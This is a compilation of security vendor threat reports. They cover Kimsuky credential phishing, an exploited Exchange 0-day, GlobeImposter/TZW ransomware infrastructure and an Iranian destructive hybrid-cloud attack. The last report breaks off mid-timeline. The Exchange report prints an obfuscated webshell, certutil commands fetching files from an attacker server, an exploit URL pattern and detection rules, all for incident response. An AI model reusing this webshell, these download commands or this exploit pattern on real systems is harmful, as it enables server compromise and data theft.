Kimsuky’s use of ReconShark as part of this activity underscores the malware’s central role within the group’s current operational playbook. 
NK News Credential Theft 
We also observed Kimsuky attempting to steal credentials for the subscription service of NK News, which is known for its comprehensive expert analyses and news reports.
Gaining access to such reports would provide Kimsuky with valuable insights into how the international community assesses and interprets developments related to North Korea, contributing to their broader strategic intelligence-gathering initiatives. 
In order to accomplish this, Kimsuky distributes an email that lure targeted individuals to log in to a spoofed NK News subscription service.
The emails prompt the recipients to confirm their NK News accounts under the pretext of recent security updates. 
Phishing Email The fake login site, hosted at https[://]www.nknews[.]pro/ip/register/, features a login form with the standard web elements, such as Sign In, Sign Up, and Forgot Password?
buttons.
When clicked, the Sign In button executes the loginAct JavaScript function, whereas the rest of the buttons do not conduct any activities. 
Fake NK News login site The JavaScript code captures entered credentials by issuing an HTTP POST request to https[://]www.nknews[.]pro/ip/register/login[.]php and then redirects the user to the legitimate NK News site. 
JavaScript code The main website hosted at https[://]www.nknews[.]pro redirects to the legitimate NK News site, https://nknews.org, and uses a certificate issued by Sectigo: Thumbprint: a1597d197e9b084a043ada5c7dac1f9b6d7f7af3 
Serial number: 00f342582c9a299acf2452aaf5115c5be0 
The domain nknews[.]pro, registered through Namecheap, also resolves to the Kimsuky-linked IP address 162.0.209[.]27.
The URL https[://]www.nknews[.]pro/config[.]php hosts a password-protected remote management site, which is likely an implementation of the b374k tool, based on the implementation of the login site and the presence of the config.php file.
The Kimsuky group is known to use this tool for remote management of its infrastructure. 
b374k login site Conclusion SentinelLabs remains actively engaged in monitoring the activities conducted by Kimsuky.
The findings presented in this post highlight the group’s persistent commitment to targeted social engineering attacks and underscore the need for increased awareness and understanding of Kimsuky’s tactics among potential targets.
Maintaining vigilance and implementing effective security measures are imperative to mitigate the risks posed by this persistent threat actor. 
Indicators of Compromise Indicator Description nknews[.]pro Phishing email sender domain chad.ocarroll@nknews[.]pro Phishing email sender address membership@nknews[.]pro Phishing email sender address https[://]www.nknews[.]pro Website impersonating NK News https[://]www.nknews[.]pro/config[.]php Website impersonating NK News: b374k login site https[://]www.nknews[.]pro/ip/register/ Website impersonating NK News:
Fake NK News login site https[://]www.nknews[.]pro/ip/register/login[.]php Website impersonating NK News: NK News credential theft endpoint https[://]staradvertiser.store/piece/ca[.]php ReconShark payload hosting endpoint https[://]staradvertiser.store/piece/r[.]php ReconShark C2 server endpoint 162.0.209[.]27 Website impersonating NK News, ReconShark C2 server: IP address 4150B40C00D8AB2E960AA059159149AF3F9ADA09 Malicious document (password-protected): SHA1 hash 7514FD9E5667FC5085373704FE2EA959258C7595 Malicious document: SHA1 hash 41E39162AE3A6370B1100BE2B35BB09E2CBE9782 
ReconShark: SHA1 hash 
title: Warning: New attack campaign utilized a new 0-day RCE vulnerability on Microsoft Exchange Server url: https://www.gteltsc.vn/blog/warning-new-attack-campaign-utilized-a-new-0day-rce-vulnerability-on-microsoft-exchange-server-12715.html Circa the beginning of August 2022, while doing security monitoring & incident response services, GTSC SOC team discovered that a critical infrastructure was being attacked, specifically to their Microsoft Exchange application.
During the investigation, GTSC Blue Team experts determined that the attack utilized an unpublished Exchange security vulnerability, i.e., a 0-day vulnerability, thus immediately came up with a temporary containment plan.
At the same time, Red Team experts started researching and debugging Exchange de-compiled code to find the vulnerability and exploit code.
Thanks to experience finding the previous 1-day Exchange exploit, the RedTeam has a great understanding of Exchange’s code flows and processing mechanisms, therefore research time was reduced, and the vulnerability was uncovered quickly.
The vulnerability turns out to be so critical that it allows the attacker to do RCE on the compromised system.
GTSC submitted the vulnerability to the Zero Day Initiative (ZDI) right away to work with Microsoft so that a patch could be prepared as soon as possible. 
ZDI verified and acknowledged 2 bugs, whose CVSS scores are 8.8 and 6.3, concerning the exploit as follows. 
However up to now, GTSC has seen other customers also experiencing the similar problem.
After careful testing, we confirmed that those systems were being attacked using this 0-day vulnerability.
To help the community temporarily stop the attack before an official patch from Microsoft is available, we publish this article aiming to those organizations who are using Microsoft Exchange email system. 
Vulnerability information The exploit process comprises of two parts as follows: - Requests with a similar format to the ProxyShell vulnerability: autodiscover/autodiscover.json?@evil.com/<Exchange-backend-endpoint>&Email=autodiscover/autodiscover.json%3f@evil.com.
This looks familiar, right? -
The use of the link above to access a component in the backend where the RCE could be implemented.
However at this time, we would like NOT to release technical details to implement RCE yet. 
Post-exploit activities After successfully mastering the exploit, we recorded attacks to collect information and create a foothold in the victim's system.
The attack team also used various techniques to create backdoors on the affected system and perform lateral movements to other servers in the system. 
Webshell 
We detected webshells, mostly obfuscated, being dropped to Exchange servers.
Using the user-agent, we detected that the attacker uses Antsword, an active Chinese-based opensource cross-platform website administration tool that supports webshell management. 
<%@Page
Language="Jscript"%> <%eval(System.
Text.
Encoding.
GetEncoding(936).GetString(System.
Convert.
FromBase64String('NTcyM'+'jk3O3'+'ZhciB'+'zYWZl'+''+'P'+'S'+char(837-763)+System.
FromBase64String('MQ=='))+char(51450/525)+''+''+char(0640-0462)+char(0x8c28/0x1cc)+char(0212100/01250)+System.Text.
FromBase64String('Wg=='))+'m'+''+'UiO2V'+'2YWwo'+'UmVxd'+'WVzdC'+'5JdGV'+'tWydF'+'WjBXS'+'WFtRG'+'Z6bU8'+'xajhk'+'J10sI'+'HNhZm'+'UpOzE'+'3MTY4'+'OTE7'+'')));%> 
We suspect that these come from a Chinese attack group because the webshell codepage is 936, which is a Microsoft character encoding for simplified Chinese. 
Another notable feature is that the hacker also changes the content of the file RedirSuiteServiceProxy.aspx to webshell content.
RedirSuiteServiceProxy.aspx is a legitimate file name available in the Exchange server. 
FileName Path RedirSuiteServiceProxy.aspx C:\ProgramFiles\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth Xml.ashx C:\inetpub\wwwroot\aspnet_client pxh4HG1v.ashx C:\ProgramFiles\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth During the incident response process at another customer, GTSC noted that the attack team used another webshell template Filename: errorEE.aspx SHA256: be07bd9310d7a487ca2f49bcdaafb9513c0c8f99921fdf79a05eaba25b52d257 Ref: https://github.com/antonioCoco/SharPyShell Command Execution Besides collecting information on the system, the attacker downloads files, and checks connections through certutil, which is a legitimate tool available in the Windows environment. 
“cmd” /c cd /d "c:\\PerfLogs"&certutil.exe -urlcache -split -f
http://206.188.196.77:8080/themes.aspx
c:\perflogs\t&echo
[S]&cd&echo [E] "cmd" /c cd /d "c:\\PerfLogs"&certutil.exe -urlcache -split -f
https://httpbin.org/get
c:\test&echo
[S]&cd&echo [E] It should be noted that every command ends with the string echo
[S]&cd&echo
[E], which is one of the signatures of the Chinese Chopper. 
In addition, the hacker also injects malicious DLLs into the memory, drops suspicious files on the attacked servers, and executes these files through WMIC. 
Suspicious File On the servers, we detected suspicious files of exe and dll formats FileName Path DrSDKCaller.exe C:\root\DrSDKCaller.exe all.exe C:\Users\Public\all.exe dump.dll C:\Users\Public\dump.dll ad.exe C:\Users\Public\ad.exe gpg-error.exe C:\PerfLogs\gpg-error.exe cm.exe C:\PerfLogs\cm.exe msado32.tlb C:\Program Files\Common Files\system\ado\msado32.tlb Among the suspect files, based on the commands executed on the server, we determined that all.exe and dump.dll are responsible for credentials dumping on the server system.
After that, the attacker uses rar.exe to compress dumped files and copy them to the webroot of the Exchange server.
Unfortunately, during the response process, the above files no longer exist on the compromised system, possibly due to the hacker’s evidence deletion. 
The cm.exe file that is dropped into the C:\PerfLogs\ folder is the standard Windows command line tool cmd.exe. 
Malware Analysis DLL information File name: Dll.dll Sha256: 074eb0e75bb2d8f59f1fd571a8c5b76f9c899834893da6f7591b68531f2b5d82 45c8233236a69a081ee390d4faa253177180b2bd45d8ed08369e07429ffbe0a9 9ceca98c2b24ee30d64184d9d2470f6f2509ed914dafb87604123057a14c57c0 29b75f0db3006440651c6342dc3c0672210cfb339141c75e12f6c84d990931c3 c8c907a67955bcdf07dd11d35f2a23498fb5ffe5c6b5d7f36870cf07da47bff2 DLL analysis GTSC analyzes a specific sample (074eb0e75bb2d8f59f1fd571a8c5b76f9c899834893da6f7591b68531f2b5d82) to describe the behavior of the malicious code, other DLL samples have the similar tasks and behaviors, differing only in listener configuration. 
The DLL consists of two classes: Run and m, each of which calls to methods that perform different tasks.
Specifically: The Run class creates a listener that listens for connections to port 443 at the path https://*:443/ews/web/webconfig/. After listening, the malware creates a new thread that calls to r. Method r does: - Check whether the received request has data in the body or not, if not then returns result 404. 
- Conversely, if the request includes data, the DLL continues to process the stream inside the IF branch: Check if the received request includes "RPDbgEsJF9o8S=" or not.
If yes, call method i in class m to handle received request.
Results returned from Run.m.i will be coverted to a base64 string.
Results returned to the client in the following format { "result":1, "message":"base64(aes(result))
" } Class m Method
i does: - Decrypt the request received using AES algorithm where the first 16 bytes of the request are the IV value, the next 16 bytes are the key value, the rest are the data. 
- After decoding, get the first element in the array as a flag to handle the defined cases as follows: o Case 0: Call to method info.
This method is responsible for collecting system information.
Information such as operating system architecture, framework version, operating system version, etc.
GTSC simulates case 0 with the image below.
The request is sent in a format that the first 16 bytes are the IV value, the next 16 bytes are the key value, followed by a flag to specify the option, and the rest is data. 
base64 (IV | key | aes(flag|data)) o Case 1: Calls to method sc, which is responsible for allocating memory to implment the shellcode o Case 2: Call to two methods p and r. Method p handles data separated by the "|" character, save to array array3.
The array array3 will take the first 2 elements as parameters for method r, which is responsible for executing the command o Case 3: Call to method ld, which is responsible for listing directory and file information in the format D|-|<Date created> |<Date modified> |<folder or file name> o Case 4: Call to method wf, which is responsible for writing files o Case 5: Call to method rf, which is responsible for reading files o Case 6: Create a folder o Case 7: Delete file or folder o Case 8: Moving file o
Case 9: Set time for a file o Case 10: Load and execute C# bytecode received from request. 
The other DLL samples have similar tasks, and are only different in listener configurations as follows: 
Victim 1: https://*:443/ews/web/webconfig/ https://*:443/owa/auth/webcccsd/ https://*:444/ews/auto/ https://*:444/ews/web/api/ Victim 2: http://*:80/owa/auth/Current/script/ https://*:443/owa/auth/Current/script/ GTSC also detected that the DLL was injected into the memory of the svchost.exe process.
The DLL makes a connection to send and receive data to the address 137[.]184[.]67[.]33 that is fixed in the binary.
Sending and receiving data with C2 using the RC4 encryption algorithm where the key will be generated at runtime. 
Temporary containment measures GTSC's direct incident response process recorded more than 1 organizations being the victims of an attack campaign exploiting this 0-day vulnerability.
In addition, we are also concerned that there may be many other organizations that have been exploited but have not been discovered.
While waiting for the official patch from the company, GTSC provides a temporary remedy to reduce the vulnerability of attacks by adding a rule to block requests with indicators of attack through the URL Rewrite Rule module on IIS server. 
- In Autodiscover at FrontEnd select tab URL Rewrite, select Request Blocking - Add string “.*autodiscover\.json.*\@.*Powershell.
*“ to the URL Path: - Condition input: Choose {REQUEST_URI} We recommend all organizations/enterprises around the world that are using Microsoft Exchange Server to check, review, and apply the above temporary remedy as soon as possible to avoid potential serious damages. 
Detection: To help organizations check if their Exchange Servers have been exploited by this bug yet, GTSC have released guideline and a tool to scan IIS log files (stored by default in the %SystemDrive%\inetpub\logs\LogFiles folder ): 
Method 1: Use powershell command: Get-ChildItem -Recurse -Path <Path_IIS_Logs> -Filter "*.log"
| Select-String -Pattern 'powershell.*autodiscover\.json.*\@.*200 Method 2: Use the tool developed by GTSC:
Based on the exploit signature, we build a tool to search with much shorter time needed than using powershell.
The link to download: https://github.com/ncsgroupvn/NCSE0Scanner Indicators of Compromise (IOCs) Webshell: 
File Name: pxh4HG1v.ashx Hash (SHA256): c838e77afe750d713e67ffeb4ec1b82ee9066cbe21f11181fd34429f70831ec1 Path: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\pxh4HG1v.ashx File Name: RedirSuiteServiceProxy.aspx Hash (SHA256): 65a002fe655dc1751add167cf00adf284c080ab2e97cd386881518d3a31d27f5 Path: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\RedirSuiteServiceProxy.aspx File Name: RedirSuiteServiceProxy.aspx Hash (SHA256): b5038f1912e7253c7747d2f0fa5310ee8319288f818392298fd92009926268ca Path: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\RedirSuiteServiceProxy.aspx File Name: Xml.ashx Hash (SHA256): c838e77afe750d713e67ffeb4ec1b82ee9066cbe21f11181fd34429f70831ec1 Path: Xml.ashx Filename: errorEE.aspx SHA256: be07bd9310d7a487ca2f49bcdaafb9513c0c8f99921fdf79a05eaba25b52d257 Path: 
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\errorEE.aspx DLL: 
File name: Dll.dll SHA256: 074eb0e75bb2d8f59f1fd571a8c5b76f9c899834893da6f7591b68531f2b5d82 45c8233236a69a081ee390d4faa253177180b2bd45d8ed08369e07429ffbe0a9 9ceca98c2b24ee30d64184d9d2470f6f2509ed914dafb87604123057a14c57c0 29b75f0db3006440651c6342dc3c0672210cfb339141c75e12f6c84d990931c3 c8c907a67955bcdf07dd11d35f2a23498fb5ffe5c6b5d7f36870cf07da47bff2 File name: 180000000.dll (Dump từ tiến trình Svchost.exe) SHA256: 76a2f2644cb372f540e179ca2baa110b71de3370bb560aca65dcddbd7da3701e IP: 125[.]212[.]220[.]48 5[.]180[.]61[.]17 47[.]242[.]39[.]92 61[.]244[.]94[.]85 86[.]48[.]6[.]69 86[.]48[.]12[.]64 94[.]140[.]8[.]48 94[.]140[.]8[.]113 103[.]9[.]76[.]208 103[.]9[.]76[.]211 104[.]244[.]79[.]6 112[.]118[.]48[.]186 122[.]155[.]174[.]188 125[.]212[.]241[.]134 185[.]220[.]101[.]182 194[.]150[.]167[.]88 212[.]119[.]34[.]11 URL: hxxp://206[.]188[.]196[.]77:8080/themes.aspx C2: 137[.]184[.]67[.]33 Mitre ATT&CK Mapping Tatic ID Name Resource Development T1586.002 Compromise Accounts: Email Accounts Execution T1059.003 Command and Scripting Interpreter:
Windows Command Shell Execution T1047 Windows Management Instrumentation Persistence T1505.003 Server Software Component: Web Shell Defense Evasion T1070.004 Indicator Removal on Host: File Deletion Defense Evasion T1036.005 Masquerading: Match Legitimate Name or Location Defense Evasion T1620 Reflective Code Loading Credential Access T1003.001 OS Credential Dumping:
LSASS Memory Discovery T1087 Account Discovery Discovery T1083 File and Directory Discovery Discovery T1057 Process Discovery Discovery T1049 System Network Connections Discovery Lateral Movement T1570 Lateral Tool Transfer Collection T1560.001 Archive Collected Data: Archive via Utility 28/09/2022 GTSC TEAM 
title:
Recent TZW Campaigns Revealed As Part of GlobeImposter Malware Family url: https://www.sentinelone.com/blog/recent-tzw-campaigns-revealed-as-part-of-globeimposter-malware-family/ In recent years, efforts to apprehend threat groups and shrink their operating landscape have gone international.
As authorities across multiple countries continue to implement sanctions and openly communicate current trends to the public, threat groups increasingly resort to rebranding or creating similar variants under different names to sidestep crackdowns and obfuscate their identities. 
In a February 2023 blog post, Ahnlab described a new ransomware campaign affecting South Korean organizations which deployed a malware they dubbed “TZW” ransomware.
Our research links TZW ransomware to a known malware family called GlobeImposter (sometimes referred to as LOLNEK or LOLKEK).
Close inspection of host origins and prominent file similarities used in both TZW and GlobeImposter campaigns suggest that actors behind GlobeImposter are updating their payloads and obfuscating their infrastructure in a manner consistent with a rebrand effort. 
Overview of GlobeImposter & New Variant TZW GlobeImposter has a long and winding history.
First observed in-the-wild in 2016, the name “GlobeImposter” is based on the ransomware’s mimicry of Globe ransomware payloads.
Multiple new versions and variations of GlobeImposter have appeared in the years since.
Frequently, these have been referred to by their extension (e.g., .DREAM, .Nutella, .NARCO, .LEGO).
However, these are all part of the same umbrella malware family.
In that same year, Emisoft released a decryption tool for early versions of GlobeImposter.
Shortly after, the malware authors responded with an updated version for which no decryption tools are available. 
Since 2017, campaigns delivering GlobeImposter have continued to proliferate even though the ransomware has only evolved slightly.
The ransomware has also been used in conjunction with some well-documented high-end cybercriminal groups.
For example, in 2017 TA505 (also known as G0092, GOLD TAHOE) began using GlobeImposter in replacement of Jaff, GandCrab, and Snatch to extend the reach and effectiveness of their campaigns. 
GlobeImposter’s Delivery Methods Explained GlobeImposter is most often delivered via phishing email as an attachment or a link to a malicious attachment.
The payloads are typically distributed via 7zip or traditional zip file archives.
The archives often include a JavaScript (.js) file that downloads and executes the GlobeImposter payload. 
More recent campaigns from within the past three years still tend to follow this formula. 
GlobeImposter has also been distributed as a later-stage infection within some well-known botnets.
For example, in 2017 GlobeImposter was distributed via the Necurs botnet.
This occurred as part of multiple spam campaigns that also included 7zip archives and followed the execution flow previously described. 
Linking TZW Attacks to GlobeImposter AhnLab’s research revealed a ransomware campaign they referred to as “TZW” with victims in South Korea.
The name is derived from the first 3 characters of the TOR-based victim portal.
A closer look suggests that “TZW” samples represent a new variant of the GlobeImposter family. 
The pre-TZW GlobeImposter ransom notes follow the same template as the current TZW samples.
Ransom note similarities are far from reliable, but it’s worth noting their likenesses. 
Example of a GlobeImposter ransom note. 
Example of a TZW variant GlobeImposter ransom note. 
Once a machine is infected, more concrete markers indicate a deeper level of similarity.
One such marker is the “CRYPTO LOCKER” string appended to the tail of the encrypted files.
This is a known marker present across GlobeImposter variants. 
Examples of CRYPTO LOCKER markers at EOF (TZW and LOLKEK variants). 
GlobeImposter has the ability to delete volume shadow copies, thereby inhibiting the recovery of data.
There are clear similarities around the methodology of the VSS removal. 
GlobeImposter shadow copy removal highlights. 
GlobeImposter vs TZW variant shadow copy removal procedure. 
Code and functionality, by and large, are identical across GlobeImposter payloads pointing to obzuqvr5424kkc4unbq2p2i67ny3zngce3tbdr37nicjqesgqcgomfqd[.] onion and those pointing to the newer tzw7ckhurmxgcpajx6gy57dkrysl2sigfrt6nk4a3rvedfldigtor7ad[.]onion. 
A thorough comparison of the two respective samples shows there are only minor differences. 
Zoomed-out view of GlobeImposter (hex) compared against the TZW variation. 
AhnLab’s research describes artifacts from a specific sample within a specific campaign.
We have seen the newer TZW variations vary somewhat with regards to file metadata. 
Two TZW payloads, varied file metadata A majority of the TZW variant samples that we have analyzed resemble the version on the left hand side.
The version on the right was seen in the samples noted by AhnLab. 
Understanding TZW and GlobeImposter’s Shared Infrastructure Previous GlobeImposter payloads directed victims to a TOR-based portal at obzuqvr5424kkc4unbq2p2i67ny3zngce3tbdr37nicjqesgqcgomfqd[.]onion. 
GlobeImposter Victim Portal 1. 
Beginning in late 2022, we start to see victims also being directed to tzw7ckhurmxgcpajx6gy57dkrysl2sigfrt6nk4a3rvedfldigtor7ad[.]onion.
The interfaces and required steps are identical: GlobeImposter Victim Portal 2 from late 2022 onward. 
At the time of writing, both victim portals remain active.
In addition, we can confirm the relationship between these via the publicly-viewable Apache Server Status Page. 
This Apache status screen is visible as a result of a misconfiguration on the Apache server, allowing us to see all the active vhosts (virtual hosts) present there. 
Apache Status page – GlobeImposter victim portal. 
Through this view we see that the following vhosts are active on the device. 
obzuqvr5424kkc4unbq2p2i67ny3zngce3tbdr37nicjqesgqcgomfqd[.]onion tzw7ckhurmxgcpajx6gy57dkrysl2sigfrt6nk4a3rvedfldigtor7ad[.]onion linux[.]3bcd0a[.]com Vhosts on GlobeImposter victim portal. 
This evidence of shared infrastructure suggests that the newly rebranded TZW ransomware samples are likely being operated by the same group that was pushing recent waves of GlobeImposter malware. 
How to Protect Against GlobeImposter and TZW Ransomware SentinelOne Singularity protects against malicious behaviors and malware associated with GlobeImposter and TZW. 
With the site policy set to Protect, GlobeImposter ransomware is detected and prevented automatically.
In Detect-only mode, analysts can observe the malware’s behaviour and file encryption attempts, rolling back the device to a clean state on completion of the test. 
Conclusion Based on our analysis, the TZW ransomware recently documented by AhnLab is yet another example of the threat actors behind GlobeImposter pivoting their TTPs alongside a rebrand, including a new but related Onion address.
We also show that the old “LOLNEK” Onion address and the Onion address within the TZW variant are hosted on the same server as two vhosts. 
Regardless of the name or brand, GlobeImposter continues to pose a threat to enterprises.
Ensuring good user hygiene, along with strong, properly-configured, and robust security controls will go a long way to prevent these attacks from affecting your environment. 
SentinelOne Singularity protects against malicious behaviors and malware associated with GlobeImposter and TZW. 
Indicators of Compromise SHA1 4585da0ff7a763be1a46d78134624f7cd13e6940 14be1c43fbfb325858cda78a126528f82cf77ad2 dc98b516c9c589c2b40bc754732ad5f16deb7c82 d034880d1233d579854e17b6ffad67a18fb33923 858f3f7f656397fcf43ac5ea13d6d4cbe7a5ca11 9a080cd497b8aa0006dc953bd9891155210c609c 8c64e820a4c5075c47c4fbaea4022dc05b3fd10b 3326708ba36393b1b4812aa8c88a03d72689ac24 cf5ab37612f24ed422a85e3745b681945c96190e cf21028b54c4d60d4e775bf05efa85656de43b68 Onions tzw7ckhurmxgcpajx6gy57dkrysl2sigfrt6nk4a3rvedfldigtor7ad[.]onion obzuqvr5424kkc4unbq2p2i67ny3zngce3tbdr37nicjqesgqcgomfqd[.]onion MITRE ATT&CK T1005 – Data from Local System T1202 – Indirect Command Execution T1486 – Data Encrypted for Impact T1070.004 – Indicator Removal:
File Deletion T1112 – Modify Registry T1012 – Query Registry T1083 – File and Directory Discovery T1027.002 – Obfuscated Files or Information: Software Packing T1082 – System Information Discovery T1490 – Inhibit System Recovery T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder 
title: MERCURY and DEV-1084: Destructive attack on hybrid environment url: https://www.microsoft.com/en-us/security/blog/2023/04/07/mercury-and-dev-1084-destructive-attack-on-hybrid-environment/ April 2023 update – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather.
MERCURY is now tracked as Mango Sandstorm and DEV-1084 is now tracked as Storm-1084. 
To learn more about the new taxonomy represents the origin, unique traits, and impact of threat actors, to get complete mapping of threat actor names, read this blog:
Microsoft shifts to a new threat actor naming taxonomy. 
Microsoft Threat Intelligence has detected destructive operations enabled by MERCURY, a nation-state actor linked to the Iranian government, that attacked both on-premises and cloud environments.
While the threat actors attempted to masquerade the activity as a standard ransomware campaign, the unrecoverable actions show destruction and disruption were the ultimate goals of the operation. 
Previous MERCURY attacks have been observed targeting on-premises environments, however, the impact in this case notably also included destruction of cloud resources.
Microsoft assesses that MERCURY likely worked in partnership with another actor that Microsoft tracks as DEV-1084, who carried out the destructive actions after MERCURY’s successful operations had gained access to the target environment. 
MERCURY likely exploited known vulnerabilities in unpatched applications for initial access before handing off access to DEV-1084 to perform extensive reconnaissance and discovery, establish persistence, and move laterally throughout the network, oftentimes waiting weeks and sometimes months before progressing to the next stage.
DEV-1084 was then later observed leveraging highly privileged compromised credentials to perform en masse destruction of resources, including server farms, virtual machines, storage accounts, and virtual networks, and send emails to internal and external recipients. 
In this blog post, we detail our analysis of the observed actor activity and related tools.
We also share information to the community and industry partners on ways to detect these attacks, including detection details of MERCURY and DEV-1084’s tools in Microsoft 365 Defender, Microsoft Defender for Identity, Microsoft Defender for Cloud Applications, Microsoft Defender Antivirus, and Microsoft Defender for Endpoint.
As with any observed nation-state actor activity, Microsoft has directly notified targeted or compromised customers, providing them with important information needed to secure their environments. 
Microsoft uses DEV-#### designations as a temporary name given to an unknown, emerging, or a developing cluster of threat activity, allowing Microsoft to track it as a unique set of information until we reach high confidence about the origin or identity of the actor behind the activity. 
Who is DEV-1084? 
Microsoft tracks the destructive actions documented in this blog post as DEV-1084.
DEV-1084 likely worked in partnership with MERCURY—an Iran-based actor that the US Cyber Command has publicly linked to Iran’s Ministry of Intelligence and Security (MOIS).
DEV-1084 publicly adopted the DarkBit persona and presented itself as a criminal actor interested in extortion, likely as an attempt to obfuscate Iran’s link to and strategic motivation for the attack. 
The link between the DEV-1084 cluster and MERCURY was established based on the following evidence: DEV-1084 operators were observed sending threatening emails from 146.70.106[.]89, an IP address previously linked to MERCURY. 
DEV-1084 used MULLVAD VPN, the same VPN provider historically used by MERCURY. 
DEV-1084 used Rport and a customized version of Ligolo.
MERCURY has also been observed using Rport and a similar version of Ligolo in previous attacks. 
DEV-1084 used the vatacloud[.]com domain for command and control (C2) during this incident.
Microsoft assesses with high-confidence that the vatacloud[.]com domain is controlled by MERCURY operators. 
Microsoft assesses that MERCURY gains access to the targets through remote exploitation of an unpatched internet-facing device.
MERCURY then handed off access to DEV-1084.
It is not currently clear if DEV-1084 operates independently of MERCURY and works with other Iranian actors or if DEV-1084 is an ‘effects based’ sub-team of MERCURY that only surfaces when MERCURY operators are instructed to carry out a destructive attack. 
Early activities, related attacker tools and techniques Microsoft assesses with moderate confidence that the threat actors attempted several times and succeeded to perform initial intrusion leveraging exposed vulnerable applications, for example, continuing to exploit Log4j 2 vulnerabilities in unpatched systems in July 2022. 
After gaining access, the threat actors deploy several tools and leverage techniques to maintain persistence, which provide effective and continued access to compromised devices, such as the following: 
Installing web shells Adding a local user account and elevating privileges to local administrator Installing legitimate remote access tools, such as RPort, Ligolo and eHorus Installing a customized PowerShell script backdoor Stealing credentials Once the persistence is established, the threat actors perform extensive discovery leveraging common native Windows tools and commands such as netstat and nltest.
Such reconnaissance activities were seen leveraged throughout the attack chain. 
The threat actors consistently perform extensive lateral movement actions using the acquired credentials within a targeted environment.
These actions mainly involved: Remote scheduled tasks to launch their customized PowerShell backdoor Windows Management Instrumentation (WMI) to launch commands on devices Remote services to run encoded PowerShell commands After infecting the new devices, the threat actors often installed the same persistence mechanisms as described above.
Interestingly, after each main attack step, the actors did not always immediately continue their operations but would wait weeks and sometimes months before moving to the next step. 
For execution and communication, the threat actors leverage several C2 servers and sometimes deploy tunnelling tools, such as Ligolo and OpenSSH, commonly leveraged to stay under the radar of security teams and solutions. 
On-premises destructive impact In observed activity, the threat actors leveraged highly privileged credentials and access to domain controllers on on-premises destructive operations to prepare for large-scale encryption of targeted devices. 
To do so, they first interfered with security tools using Group Policy Objects (GPO).
With defenses impaired, the threat actors proceeded to stage the ransomware payload in the NETLOGON shares on several domain controllers. 
GPO was leveraged again to register a scheduled task used to launch the ransomware payload.
Finally, the ransomware payload encrypted files found on the file system of the targeted devices by changing the file name extension to DARKBIT and dropped ransom notes. 
Figure 1.
On-premises attack flow Moving from on-premises to cloud To move from on-premises to the cloud, the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent.
Two weeks before the ransomware deployment, the threat actors first used a compromised, highly privileged account to access the device where the Azure Active Directory (Azure AD) Connect agent is installed.
We assess with high confidence that the threat actors then used the AADInternals tool to extract the plaintext credentials of a privileged Azure AD account.
The threat actors then used these credentials to pivot from the on-premises environment to the Azure AD environment. 
Azure AD Connect is an on-premises application for managing hybrid identities through features like password hash synchronization, pass-through authentication, objects synchronization, and others.
As part of the express settings installation process, multiple accounts are created both in the on-premises (Windows Server Active Directory) and cloud (Azure AD) environments.
The first account is the AD DS Connector Account.
The account name is prefixed with MSOL_
and it is created with a long complex password. 
Figure 2.
Example of AD DS Connector account 
This account’s permissions are set based on features enabled during the service’s installation, but in most common scenarios, the account has permissions to replicate directory changes, modify passwords, modify users, modify groups, and so on (see all the permissions here).
In addition, during installation, an Azure AD account called the Azure AD Connector Account is also created.
This account is used by the synchronization service to manage Azure AD objects.
The account is created with a long complex password as well, and by default (if using the express settings) prefixed with Sync_[ServerName].
This user is assigned with the Directory Synchronization Accounts role (see detailed permissions of this role here).
In older versions, this account might be assigned with the Global Administrator role. 
Figure 3.
Example of an Azure AD Connector account There are other entities detailed here that are created but are less relevant to this topic. 
Extracting credentials Two weeks before the ransomware deployment, the threat actors were observed using compromised credentials to access the Azure AD Connect device.
Next, they set up an SSH tunnel to an attacker-controlled device.
On a separate attacker-controlled compromised device, evidence indicates cloning of the AADInternals tool.
One of the functions available in this tool’s library is Get-AADIntSyncCredentials, which allows any local administrator on a device where Azure AD Connect is installed to extract the plaintext credentials of both the Azure AD Connector account and the AD DS Connector account. 
Shortly before the ransomware deployment, we observed authentication from a known attacker IP address into the Azure AD Connector cloud account.
Investigating this sign-in showed that the threat actors were able to access the account on the first attempt without any guessing or modification of the password, indicating that the actors possessed the password for this account.
The Azure AD Connector account is configured with single-factor authentication, making it easier for the attacker to gain entry and elevate privileges. 
Cloud destructive impact On the day of the ransomware attack, the threat actors executed multiple actions in the cloud using two privileged accounts.
The first account was the compromised Azure AD Connector account, which had Global Administrator permissions as it was set up for an old solution (DirSync).
For the second account, which also had Global Administrator permissions, the threat actors leveraged RDP for access into the account.
Even though this account had MFA in place, the threat actors accessed it through RDP, which is an open session that evades MFA blocking their activities. 
Figure 4.
Pivoting to the cloud Mass Azure resource deletion On the same day, a successful sign-in to the Microsoft Azure environment was observed.
The threat actors claimed the Global Administrator permission through Azure Privileged Identity Management (PIM) and elevated access to get permissions to the target’s management groups and Azure subscriptions.
The Azure AD Connector account and the compromised administrator account were then used to perform significant destruction of the Azure environment—deleting within a few hours server farms, virtual machines, storage accounts, and virtual networks.
We assess that the attacker’s goal was to cause data loss and a denial of service (DoS) of the target’s services. 
Exchange Web Server API abuse The actors went on to provide an existing legitimate OAuth application with both the full_access_as_app permission and administrator consent, which granted the threat actors full access to mailboxes through Exchange Web Services. Figure 5.
Adding access permission to the existing application With the obtained cloud administrator privileges, the threat actors updated the OAuth application with certificates to conduct malicious activities. 
These newly added credentials could then be used to issue access tokens and authenticate on behalf of the application to access cloud resources. 
We then observed the threat actors using this application’s permissions to perform GetItem operations over many mailboxes in the target environment.
They also performed thousands of search activities, which we suspect were attempts to dump mailboxes and/or search for sensitive data in them. 
Email impersonation The threat actors used the compromised administrator account to grant SMTP Send on behalf permissions to the Azure AD Connector account over a high-ranking employee’s mailbox, using the Set-Mailbox PowerShell cmdlet. Figure 6.
Threat actors granting access to send emails on behalf of the target’s account Emails were then created and sent both internally and externally. 
Figure 7.
Threat actors successfully sent email through the targeted account The timeline below summarizes the sequence of events: Figure 8.
